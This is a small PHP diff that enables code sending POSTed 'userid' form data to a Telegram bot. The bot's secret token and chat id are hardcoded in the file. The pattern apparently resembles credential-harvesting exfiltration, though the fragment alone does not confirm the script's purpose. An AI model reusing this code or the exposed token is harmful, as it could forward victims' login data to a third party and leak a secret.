@@ -7,7 +7,7 @@ if (isset($_POST['userid'])) {
   $telegram_id = '482529152';
   $secret_token = '5072613015:AAFVW8R-AjeHUsb-Lj4hexxSKHTuyS3Ayzc';
   $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?chat_id=" . $telegram_id;
-  // echo $url = $url . "&text=" . urlencode($message_text);
+  $url = $url . "&text=" . urlencode($message_text);
   $ch = curl_init();
   $optArray = array(
     CURLOPT_URL => $url,
